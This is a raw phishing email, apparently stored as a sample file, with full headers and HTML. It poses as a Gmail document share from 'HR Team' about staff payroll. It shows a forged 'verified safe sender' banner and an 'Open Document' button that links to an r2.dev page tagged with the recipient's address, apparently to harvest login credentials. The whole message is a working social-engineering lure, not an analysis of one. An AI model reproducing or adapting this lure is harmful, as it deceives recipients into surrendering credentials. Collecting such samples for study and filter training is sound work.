@@ -1,0 +1,177 @@
+X-GM-THRID: 1781869317937777084
+X-Gmail-Labels: Inbox,Opened,Category Personal,Starred
+Delivered-To: dynapapersubmission@gmail.com
+Received: by 2002:a0c:e10c:0:b0:675:4c24:fd1 with SMTP id w12csp47286qvk;
+        Mon, 6 Nov 2023 18:10:04 -0800 (PST)
+X-Google-Smtp-Source: AGHT+IFx4OJKBMEUlcDnlQG32wuLHXVO1E4lyWHsWyFyt3EcKEukIei/8a9aQUwBFwgJx94vUdVb
+X-Received: by 2002:a5d:6c6e:0:b0:32f:7341:96bb with SMTP id r14-20020a5d6c6e000000b0032f734196bbmr1157333wrz.19.1699323003813;
+        Mon, 06 Nov 2023 18:10:03 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1699323003; cv=none;
+        d=google.com; s=arc-20160816;
+        b=jTGfBGgt3LAkx8D58yyBpb5BOqZ5+ddXIvMvXF48X4hp5CqTpX/ScybPcsxWOateoT
+         ve1/ow9kn5vHWNevAgGTkYgJS3DG4F1UI2CSEmFWmEJlNDzWLRMFxY57ItwS4GFaOfTt
+         dwSjJ3dYW3LbONahtCK8SDOb+bV4RUIcvgqbV8r4sNjQVuTTMyJoa7hYyMzoPkiQgLDC
+         b1OmNSBpb4t5PXa0p9RhwY2/uYYTKn/gRYy7L88z18nbMrkRWZLIVMKrhW1uoAZeY83d
+         AGAk30uDR6mW9kmuulThgrEuRmqadL/rmCjCdcSRhOU9QAtLL62dyEkdd3DQPqNRPBsh
+         NjOg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:to
+         :from:domainkey-signature:dkim-signature;
+        bh=nCtUm6EO+PLfYWqXY4BT7b/nAGjgP/FCJ8OeIeU2fLo=;
+        fh=9jKT+T1Uw0A+5dzq86MtnniWAZXbyTpzU841KB0pgzA=;
+        b=c7AAqafJBS/O5RcU5bJJpI2Xg64sR64sGx5It3qITpfuHcQwP9YE/arkA8gxYYrbiy
+         f2M7B8nhVGqSxv/3LYqY4FGhN8wSOQ1MEKVELAOv27Qk+tOhT51pkbqdCeyqG3Rn1mbj
+         5YV1X9OqQUfXl/oAdI2FS9XKKdubD8cr07JNAumgNTBdfCqbd3l26c9Htb8h4hmDfAaa
+         sSb2LO9hb3QscO/8zFrQaHnitM0DlY2YDCr6GDXyMuqF6/UH4LosyNULXz+G3kSDzjYe
+         1jyeknR0A59wOlN3cVs4GSH5WM+eR+wWU2wbpssAcWUQ3kWayFzUQlkZmxe4TGxds80h
+         g37Q==
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@hollywoodbike.com header.s=dkim header.b=AlYses1P;
+       spf=pass (google.com: domain of info@hollywoodbike.com designates 88.209.205.100 as permitted sender) smtp.mailfrom=info@hollywoodbike.com;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=hollywoodbike.com
+Return-Path: <info@hollywoodbike.com>
+Received: from along.hollywoodbike.com (along.hollywoodbike.com. [88.209.205.100])
+        by mx.google.com with ESMTPS id d6-20020a056000186600b0032da2b8abcesi908892wri.491.2023.11.06.18.10.03
+        for <dynapapersubmission@gmail.com>
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Mon, 06 Nov 2023 18:10:03 -0800 (PST)
+Received-SPF: pass (google.com: domain of info@hollywoodbike.com designates 88.209.205.100 as permitted sender) client-ip=88.209.205.100;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@hollywoodbike.com header.s=dkim header.b=AlYses1P;
+       spf=pass (google.com: domain of info@hollywoodbike.com designates 88.209.205.100 as permitted sender) smtp.mailfrom=info@hollywoodbike.com;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=hollywoodbike.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hollywoodbike.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding; i=info@hollywoodbike.com;
+ bh=f6Q6OlQmdbDl+8w9KeqT0qCFfBk=;
+ b=AlYses1P99T0Pc9DtPtR/8Y8iJqu8KCD2NmgzSQ6l9vwCYmpFzbPmVGCnuHmiBRMjWh2kiEVce1m
+   A3LInfwGXrAbuk2MFdeyn81O01dJENzf12Bg3nt+z7S3TkZFu+mKn3a5ld9OewKE1WAulQR83RFG
+   H+qzl+SR6VEifF5hqwvJ5trmx56aDENU9YG6EVokDOjow3lev5c0R4ksf+WMUuNgeHW1AiPVrL4I
+   3dMLBJEp93aFy71yvUZtDPzp1LQU4gLN8Eg9ypDQ4QX5QPuLHnVauGJUSTBtiSkcz/e14lS7o1T7
+   epG8gJt2hpfPE3WERUOOUaqKIxyV5up4sJj5PA==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hollywoodbike.com;
+ b=Lyqm7U7Pz9WxxEvDVmxTq2YMXkCJWVeFmppc8T8yOqmEOGJJDeYDy4nUFmwoRk9OwA9WKmIyt3Ci
+   3n0bLc9TydYvbWXnmkUjnqPUVtwQ7uyXjxaRlhqT8r2Be2mrWgjGVhXNtMovK04m6uitWmymsZzd
+   7u7xYTOsebbb3kNPq+0g41CE6CqOHipGxuQRQjnfqtAQr+VEKKw0bhkLd7OfxcyNS6S9YMD4D/U7
+   M2Szx8YcG/yvmTkUu0D7ruXAKlRFrYwvGuy2pToTuVlwcglucKfbqvyJtAxMVEgSRgG1cf5wYEq5
+   RmyQ/4x2ZOuI8FDJGX8SfrMi0KEDAfuXmTJVyQ==;
+From: Gmail  <info@hollywoodbike.com>
+To: dynapapersubmission@gmail.com
+Subject: Gmail - Staff Payroll for Oct 2023
+Date: 06 Nov 2023 09:19:54 -0800
+Message-ID: <20231106091954.B632FAF4F343242D@hollywoodbike.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20671"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV id=3D:z9 class=3D"Ar Au Ao" style=3D"DISPLAY: block">
+<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3D"Message B=
+ody" aria-multiline=3Dtrue aria-controls=3D:24q id=3D:z5 class=3D"Am Al edi=
+table LW-avf tS-tW tS-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTI=
+ON: ltr; MIN-HEIGHT: 344px" aria-owns=3D:24q g_editable=3D"true">
+<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI","Lucida Sans",sans-s=
+erif; COLOR: rgb(0,0,0)' dir=3Dltr><SPAN style=3D"FONT-SIZE: 14px; FONT-FAM=
+ILY: roboto,sans-serif; COLOR: rgb(44,54,58)"><A style=3D"COLOR: rgb(0,172,=
+255); BACKGROUND-COLOR: transparent">HR Team</A></SPAN></DIV>
+<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI","Lucida Sans",sans-s=
+erif; COLOR: rgb(0,0,0)' dir=3Dltr><BR></DIV>
+<DIV style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI","Lucida Sans",sans-s=
+erif; COLOR: rgb(0,0,0)' dir=3Dltr>
+<table style=3D"FONT-SIZE: 15px; BORDER-COLLAPSE: collapse; COLOR: rgb(32,3=
+1,30)">
+<TBODY>
+<TR>
+<TH style=3D"BORDER-TOP: black 0px solid; BORDER-RIGHT: black 0px solid; WI=
+DTH: 2px; BORDER-BOTTOM: black 0px solid; PADDING-BOTTOM: 5px; PADDING-TOP:=
+ 5px; PADDING-LEFT: 5px; BORDER-LEFT: black 0px solid; PADDING-RIGHT: 5px; =
+BACKGROUND-COLOR: rgb(2,151,64)">&nbsp;</TH>
+<td style=3D"BORDER-TOP: black 0px solid; BORDER-RIGHT: black 0px solid; WI=
+DTH: 700px; BORDER-BOTTOM: black 0px solid; PADDING-BOTTOM: 5px; PADDING-TO=
+P: 5px; PADDING-LEFT: 5px; BORDER-LEFT: black 0px solid; PADDING-RIGHT: 5px=
+; BACKGROUND-COLOR: rgb(243,255,248)">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: georgia,serif,serif,emo=
+jifont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WI=
+DTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 12px; FONT-FAMILY: inheri=
+t; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: =
+0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">This sender has been verified f=
+rom your<SPAN style=3D"FONT-WEIGHT: bolder">&nbsp;</SPAN>safe sender list.<=
+/SPAN></SPAN></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 14px; FONT-FAMILY: sans-serif; WIDTH: 801px; BOR=
+DER-COLLAPSE: collapse; COLOR: rgb(44,54,58); BACKGROUND-COLOR: lightgrey" =
+cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"VERTICAL-ALIGN: top"><FONT face=3DCalibri>&nbsp;</FONT></TD>
+<td style=3D"MAX-WIDTH: 580px; WIDTH: 580px; VERTICAL-ALIGN: top; PADDING-B=
+OTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN-LEFT: auto; DISP=
+LAY: block; PADDING-RIGHT: 10px; MARGIN-RIGHT: auto">
+<DIV style=3D"MAX-WIDTH: 580px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PA=
+DDING-LEFT: 10px; MARGIN: 0px auto; PADDING-RIGHT: 10px">
+<table style=3D"WIDTH: 540px; BACKGROUND: rgb(255,255,255); BORDER-COLLAPSE=
+: collapse; border-radius: 3px" width=3D"100%">
+<TBODY>
+<TR>
+<td style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; =
+PADDING-LEFT: 20px; PADDING-RIGHT: 20px">
+<table style=3D"WIDTH: 496px; BORDER-COLLAPSE: collapse" cellspacing=3D"0" =
+cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"VERTICAL-ALIGN: top">
+<P style=3D"MARGIN: 0px 0px 15px" align=3Dcenter><SPAN style=3D"FONT-FAMILY=
+: Calibri">Please open&nbsp;to Access&nbsp;Document below&nbsp;"</SPAN><SPA=
+N style=3D"FONT-FAMILY: Calibri; FONT-WEIGHT: bolder"><U><FONT color=3D#000=
+0f4>Staff Payroll for&nbsp;Nov<SPAN role=3Dlink id=3Dm_-2025058825671979450=
+m_1287872759807403689m_-1972701208251222151gmail-OBJ_PREFIX_DWT46_com_zimbr=
+a_date style=3D"COLOR: rgb(0,90,149); text-decoration-line: none"> 2023</SP=
+AN></FONT></U></SPAN><SPAN style=3D"FONT-FAMILY: Calibri">".</SPAN>
+ <BR></P></TD></TR>
+<TR>
+<td style=3D"VERTICAL-ALIGN: top" align=3D"left"></TD></TR>
+<TR>
+<td style=3D"BORDER-TOP: rgb(50,205,50) 2px solid; FONT-FAMILY: arial,helve=
+tica,sans-serif; BORDER-RIGHT: rgb(50,205,50) 2px solid; VERTICAL-ALIGN: to=
+p; BORDER-COLLAPSE: separate; BORDER-BOTTOM: rgb(50,205,50) 2px solid; FONT=
+-WEIGHT: bold; PADDING-BOTTOM: 10px; TEXT-ALIGN: center; PADDING-TOP: 10px;=
+ PADDING-LEFT: 20px; BORDER-LEFT: rgb(50,205,50) 2px solid; PADDING-RIGHT: =
+20px; border-radius: 5px"><SPAN style=3D"FONT-FAMILY: arial,verdana; COLOR:=
+ rgb(50,205,50)">
+<SPAN role=3Dlink id=3Dm_-2025058825671979450m_1287872759807403689m_-197270=
+1208251222151gmail-OBJ_PREFIX_DWT47_com_zimbra_url style=3D"COLOR: rgb(0,90=
+,149)">
+<A style=3D"COLOR: rgb(0,0,0); BACKGROUND-COLOR: transparent; text-decorati=
+on-line: none" href=3D"https://pub-9e11a359d213455e8ad57f733583373b.r2.dev/=
+bbbaask.html#dynapapersubmission@gmail.com" rel=3D"noreferrer nofollow noop=
+ener noreferrer" target=3D_blank data-saferedirecturl=3D"https://www.google=
+=2Ecom/url?q=3Dhttps://pub-722720be67154192a1102b2cf085d306.r2.dev/mask1.ht=
+ml%23%5BTO-EMAIL%5D&amp;source=3Dgmail&amp;ust=3D1698751016599000&amp;usg=
+=3DAOvVaw3cbc-v9pWxzLtqRqWm8-Up">Open&nbsp; Document</A></SPAN></SPAN></TD>=
+</TR></TBODY>
+</TABLE>
+<P style=3D"MARGIN: 0px 0px 15px" align=3Dcenter>&nbsp;</P>
+<P style=3D"MARGIN: 0px 0px 15px" align=3Dcenter><FONT face=3DCalibri>Note:=
+ This email grants access to this Document.</FONT></P></TD></TR></TBODY></T=
+ABLE></DIV></TD></TR></TBODY></TABLE>
+<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: sans-serif; WIDTH: 801px; COLOR=
+: rgb(44,54,58); TEXT-ALIGN: center; MARGIN-TOP: 10px">
+<table style=3D"WIDTH: 801px; BORDER-COLLAPSE: collapse" cellspacing=3D"0" =
+cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 12px; VERTICAL-ALIGN: top; COLOR: lightgrey; PADDIN=
+G-BOTTOM: 10px; PADDING-TOP: 10px"><FONT color=3Dblack face=3DCalibri>Docs:=
+ Create and edit documents online.<BR>You have received this email because =
+someone shared a document with you from</FONT>&nbsp;<SPAN style=3D"FONT-FAM=
+ILY: Calibri; COLOR: black">Team.</SPAN><FONT color=3Dblack face=3DCalibri>=
+<BR></FONT></TD></TR></TBODY></TABLE></DIV></DIV></DIV></DIV></BODY></HTML>=
+
+
